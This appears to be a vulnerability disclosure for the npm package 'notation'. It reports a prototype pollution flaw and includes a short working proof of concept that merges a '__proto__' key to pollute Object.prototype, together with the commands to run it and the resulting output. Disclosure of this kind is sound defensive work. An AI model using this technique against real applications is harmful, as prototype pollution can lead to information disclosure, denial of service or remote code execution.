# Description

`notation` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
const { Notation } = require('notation');
const obj = {}
console.log("Before : " + obj.polluted);
const notate = Notation.create(obj)
notate.merge({ '__proto__.polluted': "Yes! Polluted" })
console.log("After : " + obj.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i notation # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Polluted
```
